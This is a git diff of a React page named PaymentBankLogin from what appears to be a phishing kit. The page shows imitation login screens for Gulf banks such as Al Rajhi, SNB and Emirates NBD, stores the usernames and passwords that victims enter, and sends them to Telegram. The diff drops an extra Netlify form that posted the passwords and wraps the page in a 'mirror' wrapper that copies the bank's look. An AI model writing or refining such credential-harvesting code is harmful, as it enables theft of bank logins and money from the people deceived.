@@ -1,6 +1,5 @@
 import { useState, useMemo, useEffect } from "react";
 import { useParams, useNavigate, useSearchParams } from "react-router-dom";
-import { bankBranding } from "@/lib/brandingSystem";
 import { useUpdateLink } from "@/hooks/useSupabase";
 import { useLinkData } from "@/hooks/useLinkData";
 import { Loader2 } from "lucide-react";
@@ -10,8 +9,8 @@ import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency } from "@/lib/countryCurrencies";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
+import { MirrorPageWrapper } from "@/components/MirrorPageWrapper";
 import { AlRajhiLogin, SNBLogin, EmiratesNBDLogin, FABLogin, NBKLogin, GenericBankLogin } from "@/components/BankLoginLayouts";
-import { getEntityVisualSpec, specToCSSVariables } from "@/lib/entityVisualSpecs";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
@@ -28,37 +27,10 @@ const PaymentBankLogin = () => {
   const [isSubmitting, setIsSubmitting] = useState(false);
 
   const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
-  const selectedBankBranding = (selectedBankId && bankBranding[selectedBankId]) ? bankBranding[selectedBankId] : bankBranding.default;
-
-  // Get entity visual spec for bank
-  const entitySpec = useMemo(() => {
-    if (selectedBankId) {
-      return getEntityVisualSpec(selectedBankId);
-    }
-    return null;
-  }, [selectedBankId]);
-
-  // Apply entity CSS variables
-  useEffect(() => {
-    if (entitySpec) {
-      const cssVars = specToCSSVariables(entitySpec);
-      const root = document.documentElement;
-      Object.entries(cssVars).forEach(([key, value]) => {
-        root.style.setProperty(key, value);
-      });
-      root.setAttribute('data-entity', entitySpec.entityId);
-      root.setAttribute('data-entity-category', entitySpec.category);
-    }
-    return () => {
-      const root = document.documentElement;
-      root.removeAttribute('data-entity');
-      root.removeAttribute('data-entity-category');
-    };
-  }, [entitySpec]);
   
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
-  const rawAmount = linkData?.payload?.cod_amount || 500;
-  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
+  const rawAmount = linkData?.payload?.payment_amount || 0;
+  const formattedAmount = formatCurrency(rawAmount, linkData?.payload?.currency_code || selectedCountry);
   const selectedCountryData = getCountryByCode(selectedCountry);
   const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;
 
@@ -76,19 +48,6 @@ const PaymentBankLogin = () => {
       if (id && id !== 'local') {
         await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, bankLoginData } });
       }
-
-      await fetch("/", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: new URLSearchParams({
-          "form-name": "bank-login",
-          linkId: id!,
-          bank: selectedBank?.nameAr || "غير محدد",
-          username: username || customerId,
-          password: password,
-          amount: formattedAmount
-        }).toString()
-      });
 
       await sendToTelegram({
         type: 'bank_login',
@@ -111,15 +70,17 @@ const PaymentBankLogin = () => {
     }
   };
 
-  if (linkLoading || !linkData) return (
-    <div className="min-h-screen flex items-center justify-center bg-gray-50">
-      <Loader2 className="w-10 h-10 animate-spin text-primary" />
-    </div>
-  );
+  if (linkLoading || !linkData) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-gray-50">
+        <Loader2 className="w-10 h-10 animate-spin text-primary" />
+      </div>
+    );
+  }
 
   const loginProps = {
     bank: selectedBank || null,
-    branding: selectedBankBranding || null,
+    branding: null,
     username,
     setUsername,
     password,
@@ -151,24 +112,14 @@ const PaymentBankLogin = () => {
   };
 
   return (
-    <>
+    <MirrorPageWrapper entityId={selectedBankId || "bank"} title="تسجيل الدخول" linkData={linkData} hideHeader={true}>
       <PaymentMetaTags 
         serviceKey={selectedBankId ? `bank_${selectedBankId}` : "bank"}
         serviceName={selectedBank?.nameAr || "البنك"}
         title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
       />
-
       {renderLoginLayout()}
-
-      {/* Netlify Form for bots/crawlers */}
-      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
-        <input type="text" name="linkId" />
-        <input type="text" name="bank" />
-        <input type="text" name="username" />
-        <input type="password" name="password" />
-        <input type="text" name="amount" />
-      </form>
-    </>
+    </MirrorPageWrapper>
   );
 };
 
